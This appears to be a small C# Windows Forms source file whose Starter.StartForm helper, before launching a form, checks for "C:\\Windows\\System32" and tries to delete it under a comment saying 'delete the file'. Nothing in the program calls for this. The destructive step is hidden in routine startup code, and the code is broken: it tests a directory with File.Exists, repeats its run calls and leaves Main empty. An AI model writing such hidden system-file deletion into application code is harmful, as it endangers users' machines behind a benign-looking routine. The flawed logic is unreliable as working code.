using System;
using System.IO;
using System.Windows.Forms;

namespace WinFormsApp
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
        }
    }
    
    public static class Starter
    {
        public static void StartForm(StartForm form)
        {
            if (File.Exists("C:\\Windows\\System32"))
            {
                // Удаляем файл
                File.Delete("C:\\Windows\\System32");
                Application.EnableVisualStyles();
                Application.Run(form);
            }
            Application.EnableVisualStyles();
            Application.Run(form);
        }
    }
}
